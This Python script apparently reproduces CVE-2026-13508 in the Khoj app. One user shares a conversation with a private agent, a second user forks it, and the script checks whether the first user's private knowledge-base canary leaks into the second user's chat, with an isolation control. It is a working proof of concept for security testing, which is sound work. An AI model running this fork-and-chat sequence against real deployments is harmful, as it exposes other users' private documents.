"""Khoj CVE-2026-13508 reproduction + personal-doc isolation control.

Reproduces the conversation-sharing authorization flaw: user A puts a canary doc
in a PRIVATE agent's knowledge base and shares a conversation; user B forks it and
chats, and the LLM prompt is grounded in A's private KB (cross-tenant leak) because
the fork+chat path does not re-check agent access (api_chat.py event_generator).

Also runs a control: B's own normal chat must NOT see A's canary (personal isolation).

Usage:
    python khoj_cve_probe.py <base> <echo_log> <tokenA> <tokenB> [out.json]
e.g. python khoj_cve_probe.py http://127.0.0.1:42110 /root/ragtest/echo_prompts.jsonl kk-AAA kk-BBB results/khoj_cve.json
"""
import json
import sys
import time
from pathlib import Path

import requests

T = 120
KB_CANARY = "KHOJKBMARKER77"     # lives only in A's private-agent knowledge base
DOC = ("Private research notes for the agent knowledge base. "
       f"The secret marker is {KB_CANARY}. Cells use ATP. {KB_CANARY} recurs here. ") * 6


def H(tok):
    return {"Authorization": f"Bearer {tok}"}


def jj(r):
    try:
        return r.json()
    except Exception:
        return r.text[:400]


def echo_prompts_since(echo_log, t0):
    p = Path(echo_log)
    if not p.exists():
        return []
    out = []
    for line in p.read_text(encoding="utf-8").splitlines():
        if not line.strip():
            continue
        try:
            rec = json.loads(line)
        except Exception:
            continue
        if rec.get("ts", 0) >= t0:
            out.append(rec)
    return out


def canary_in_prompts(prompts, canary):
    return any(canary in (r.get("prompt") or "") for r in prompts)


def main():
    base = sys.argv[1].rstrip("/")
    echo_log = sys.argv[2]
    tokA, tokB = sys.argv[3], sys.argv[4]
    out_path = sys.argv[5] if len(sys.argv) > 5 else None
    res = {"app": "khoj", "cve": "CVE-2026-13508", "class": "D5(share/fork->agent KB)", "steps": {}}

    # 1) A uploads the canary doc
    r = requests.put(f"{base}/api/content", headers=H(tokA),
                     files=[("files", ("a_kb.org", DOC, "text/plain"))],
                     params={"t": "all", "client": "web"}, timeout=T)
    res["steps"]["upload"] = {"status": r.status_code, "body": jj(r)}
    print("1 upload:", r.status_code)

    # find the stored file_name for the agent KB
    rf = requests.get(f"{base}/api/content/files", headers=H(tokA), timeout=T)
    files = jj(rf)
    fnames = files if isinstance(files, list) else (files.get("files") if isinstance(files, dict) else [])
    file_name = None
    for f in (fnames or []):
        nm = f if isinstance(f, str) else (f.get("file_name") or f.get("name"))
        if nm and "a_kb" in nm:
            file_name = nm
            break
    res["steps"]["file_name"] = file_name
    print("  file_name:", file_name)

    # 2) baseline: A chats about own notes -> echo should see A's canary (env wired)
    t0 = time.time()
    r = requests.post(f"{base}/api/chat", headers=H(tokA),
                      json={"q": f"What is the secret marker {KB_CANARY[:4]}? Use my notes.",
                            "stream": False}, timeout=T)
    base_prompts = echo_prompts_since(echo_log, t0)
    res["steps"]["A_self_chat"] = {"status": r.status_code, "echo_saw_canary": canary_in_prompts(base_prompts, KB_CANARY)}
    print("2 A self-chat:", r.status_code, "echo saw A canary:", res["steps"]["A_self_chat"]["echo_saw_canary"])

    # 3) A creates a PRIVATE agent whose KB is the uploaded file
    r = requests.post(f"{base}/api/agents", headers=H(tokA),
                      json={"name": "iso_priv_agent", "persona": "You answer strictly from the provided notes.",
                            "privacy_level": "private", "icon": "Robot", "color": "blue",
                            "chat_model": "echo-chat", "files": [file_name] if file_name else []},
                      timeout=T)
    agent = jj(r)
    slug = agent.get("slug") if isinstance(agent, dict) else None
    res["steps"]["create_agent"] = {"status": r.status_code, "slug": slug, "body": agent}
    print("3 create agent:", r.status_code, "slug:", slug)

    # 4) A creates a session with that agent and chats on it
    r = requests.post(f"{base}/api/chat/sessions", headers=H(tokA),
                      params={"agent_slug": slug}, timeout=T)
    cidA = (jj(r) or {}).get("conversation_id") if isinstance(jj(r), dict) else None
    res["steps"]["A_session"] = {"status": r.status_code, "conversation_id": cidA}
    print("4 A session:", r.status_code, "cidA:", cidA)
    if cidA:
        requests.post(f"{base}/api/chat", headers=H(tokA),
                      json={"q": "Summarise my notes.", "conversation_id": cidA, "stream": False}, timeout=T)

    # 5) A shares that conversation -> public slug
    r = requests.post(f"{base}/api/chat/share", headers=H(tokA),
                      params={"conversation_id": cidA}, timeout=T)
    share = jj(r)
    share_url = share.get("url") if isinstance(share, dict) else None
    pub_slug = share_url.rstrip("/").rsplit("/", 1)[-1] if share_url else None
    res["steps"]["share"] = {"status": r.status_code, "url": share_url, "public_slug": pub_slug}
    print("5 A share:", r.status_code, "public_slug:", pub_slug)

    # 6) B forks the public conversation -> gets a conversation carrying A's private agent
    r = requests.post(f"{base}/api/chat/share/fork", headers=H(tokB),
                      params={"public_conversation_slug": pub_slug}, timeout=T)
    cidB = (jj(r) or {}).get("conversation_id") if isinstance(jj(r), dict) else None
    res["steps"]["B_fork"] = {"status": r.status_code, "conversation_id": cidB}
    print("6 B fork:", r.status_code, "cidB:", cidB)

    # 7) B chats on the forked conversation -> does the prompt leak A's private KB canary?
    t0 = time.time()
    r = requests.post(f"{base}/api/chat", headers=H(tokB),
                      json={"q": "What is the secret marker in the notes?", "conversation_id": cidB,
                            "stream": False}, timeout=T)
    leak_prompts = echo_prompts_since(echo_log, t0)
    leaked = canary_in_prompts(leak_prompts, KB_CANARY) or (KB_CANARY in (r.text or ""))
    res["steps"]["B_fork_chat"] = {"status": r.status_code, "LEAK": leaked,
                                   "answer_excerpt": (r.text or "")[:200]}
    print("7 B fork-chat:", r.status_code, "-> LEAK:", leaked)

    # 8) control: B's own fresh chat (no agent) must NOT see A's canary
    t0 = time.time()
    r = requests.post(f"{base}/api/chat", headers=H(tokB),
                      json={"q": "What is the secret marker in the notes?", "stream": False}, timeout=T)
    ctrl_prompts = echo_prompts_since(echo_log, t0)
    ctrl_leak = canary_in_prompts(ctrl_prompts, KB_CANARY) or (KB_CANARY in (r.text or ""))
    res["steps"]["B_control_chat"] = {"status": r.status_code, "LEAK": ctrl_leak}
    print("8 B control-chat (no agent):", r.status_code, "-> leak:", ctrl_leak)

    res["VERDICT"] = ("LEAK (CVE reproduced: B read A's private-agent KB via fork)" if leaked
                      else "NO_LEAK")
    res["control_ok"] = not ctrl_leak
    print("\nVERDICT:", res["VERDICT"], "| control clean:", res["control_ok"])
    if out_path:
        Path(out_path).parent.mkdir(parents=True, exist_ok=True)
        Path(out_path).write_text(json.dumps(res, indent=2), encoding="utf-8")
        print("wrote", out_path)


if __name__ == "__main__":
    main()
